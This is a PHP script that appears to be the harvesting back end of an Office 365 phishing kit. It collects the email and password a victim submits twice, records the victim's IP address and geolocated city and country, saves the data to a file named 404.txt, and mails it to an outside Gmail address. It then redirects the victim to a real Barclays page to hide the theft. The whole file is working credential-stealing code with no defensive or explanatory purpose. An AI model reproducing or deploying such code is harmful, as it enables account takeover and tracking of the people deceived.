<?php

	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BY SweezThaCreator|---\n";
    $message .= "Email Provider: Office 365\n";
    $message .= "++++++++++1er log++++++++++\n";
    $message .= "E: " . $_POST['email'] . "\n"; 
    $message .= "Ps: " . $_POST['password'] . "\n"; 
    $message .= "++++++++++2er log++++++++++\n";
    $message .= "E: " . $_POST['reemail'] . "\n"; 
    $message .= "Ps: " . $_POST['repassword'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="ashrepetto43@gmail.com";

	$subject = "Offiice 365 | $ip";
	$headers = "From: Blessing <blessing@heaven.com>";

	$file = fopen("404.txt","ab");
fwrite($file,$message);
fclose($file);

	
	$send = mail($to,$subject,$message,$headers);
	if($send){
		header("Location: https://wealth.barclays.com/en_us/home/what-we-offer/entrepreneurs.html");
	}
?>